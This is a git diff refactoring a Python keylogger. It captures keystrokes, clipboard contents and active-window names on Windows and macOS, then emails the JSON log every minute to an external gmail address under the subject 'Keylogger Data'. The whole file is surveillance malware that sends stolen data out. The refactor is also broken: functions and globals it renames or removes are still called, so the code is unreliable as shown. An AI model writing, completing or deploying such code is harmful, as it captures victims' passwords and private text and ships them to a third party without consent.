@@ -8,82 +8,83 @@ import pyperclip
 from email.message import EmailMessage
 import json
 
-# Lists to store captured data
-keystrokes = []
-clipboard_data = []
-active_window_info = []
+
+# Data storage
+data_log = {
+    "keystrokes": [],
+    "clipboard": [],
+    "active_window": []
+}
 last_clipboard = ""
-last_window = None  # Track the last active window
+last_window = None
 
-# Function to get active window on macOS
-def get_active_window_mac():
-    try:
-        result = subprocess.run(
-            ["osascript", "-e", 'tell application "System Events" to get name of (processes where frontmost is true)'],
-            capture_output=True, text=True
-        )
-        return result.stdout.strip()
-    except Exception as e:
-        return f"Error getting active window: {e}"
-
-# Function to get active window on Windows
-def get_active_window_windows():
-    try:
-        import win32gui
-        window = win32gui.GetForegroundWindow()
-        return win32gui.GetWindowText(window)
-    except Exception as e:
-        return f"Error getting active window: {e}"
-
-# Main function to get active window based on OS
+# get the active window, but depends on the operating system since there are different ways of getting the forefront process on different os
 def get_active_window():
     if platform.system() == "Windows":
-        return get_active_window_windows()
-    elif platform.system() == "Darwin":  # macOS
-        return get_active_window_mac()
-    else:
-        return "Unsupported OS"
+        try:
+            import win32gui
+            return win32gui.GetWindowText(win32gui.GetForegroundWindow())
 
-# Function to log active window only when it changes
+        except Exception as e:
+            return f"Error: {e}"
+
+    elif platform.system() == "Darwin":  # macOS
+        try:
+            result = subprocess.run(
+                ["osascript", "-e", 
+                'tell application "System Events" to get name of (processes where frontmost is true)'],
+                capture_output=True, text=True
+                # the above line is how you get the current active window/process 
+            )
+            return result.stdout.strip()
+
+        except Exception as e:
+            return f"Error: {e}"
+
+    return "Unsupported OS"
+
+# Function to only log the active window when it changes
 def log_active_window():
-    global last_window, active_window_info
+    global last_window
     active_window = get_active_window()
+
     if active_window != last_window:
         last_window = active_window
-        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
-        active_window_info.append({"timestamp": timestamp, "window": active_window})
+        data_log["active_window"].append({
+            "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
+            "window": active_window
+        })
 
-# Function to capture keystrokes
+# get keystrokes
 def on_press(key):
-    global keystrokes
     try:
-        keystrokes.append(f"{key.char}")
-    except AttributeError:
-        keystrokes.append(f"{key}")
+        data_log["keystrokes"].append(f"{key.char}") 
 
-    # Log the active window only when it changes
+    except AttributeError:
+        data_log["keystrokes"].append(f"{key}")
+
     log_active_window()
 
-# Function to capture clipboard content
+# get clipboard data
 def log_clipboard():
-    global clipboard_data, last_clipboard
+    global last_clipboard
     try:
         clipboard_content = pyperclip.paste()
-        if clipboard_content and clipboard_content.strip() != "" and clipboard_content != last_clipboard:
-            clipboard_data.append(clipboard_content)
+        if clipboard_content and clipboard_content != last_clipboard:
+            data_log["clipboard"].append(clipboard_content)
             last_clipboard = clipboard_content
-
-            # Log the active window only when it changes
             log_active_window()
+            
     except Exception as e:
         print(f"Clipboard logging error: {e}")
 
-
 def send_email(log_data):
-    sender_email = "hello@demomailtrap.com"
+    #got information and code from https://mailtrap.io 
+    sender_email = "hello@demomailtrap.com" 
     receiver_email = "geniusmyra@gmail.com"
     message = EmailMessage()
     message.set_content(log_data)
+
     message['Subject'] = 'Keylogger Data'
     message['From'] = sender_email
     message['To'] = receiver_email
@@ -98,42 +99,49 @@ def send_email(log_data):
             server.starttls()
             server.login(smtp_username, smtp_password)
             server.send_message(message)
-            print("Email sent successfully!")
-    except Exception as e:
-        print(f"Failed to send email: {e}")
+            print("Email sent successfully!") #primarily for debugging purposes
 
-def compile_log_data():
+    except Exception as e:
+        print(f"Failed to send email: {e}") #primarily for debugging purposes
+
+def get_data_in_json():
+
     global keystrokes, clipboard_data, active_window_info
+
     if not keystrokes and not clipboard_data and not active_window_info:
-        print("No data to compile.")  # Debug output
+        print("No data to compile.")  # for debugging
+
     log_data = json.dumps({
         "keystrokes": keystrokes,
         "clipboard": clipboard_data,
         "active_windows": active_window_info,
         "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')
     }, indent=4)
+
     return log_data
 
-def email_sending_loop():
-    while True:
-        log_data = compile_log_data()
-        if log_data:
-            send_email(log_data)
-        time.sleep(30)  # Adjust as necessary for your testing
-        # keystrokes.clear()
-        # clipboard_data.clear()
-        # active_window_info.clear()
-
-def monitor_clipboard():
+# Monitoring clipboard changes
+def clipboard_logging():
     while True:
         log_clipboard()
-        time.sleep(5)
+        time.sleep(10) # get clipboard data every 10 seconds
 
+# Start keylogger 
 def start_keylogger():
     with Listener(on_press=on_press) as listener:
         listener.join()
 
-# Set up threading for clipboard monitoring, keylogging, and email sending
+
+def email_sending_loop():
+
+    while True:
+        log_data = compile_log_data()
+        if log_data:
+            send_email(log_data) 
+        time.sleep(60)  # send email every minute
+
+#multi-threading
+
 keylogger_thread = threading.Thread(target=start_keylogger)
 clipboard_thread = threading.Thread(target=monitor_clipboard)
 email_thread = threading.Thread(target=email_sending_loop)
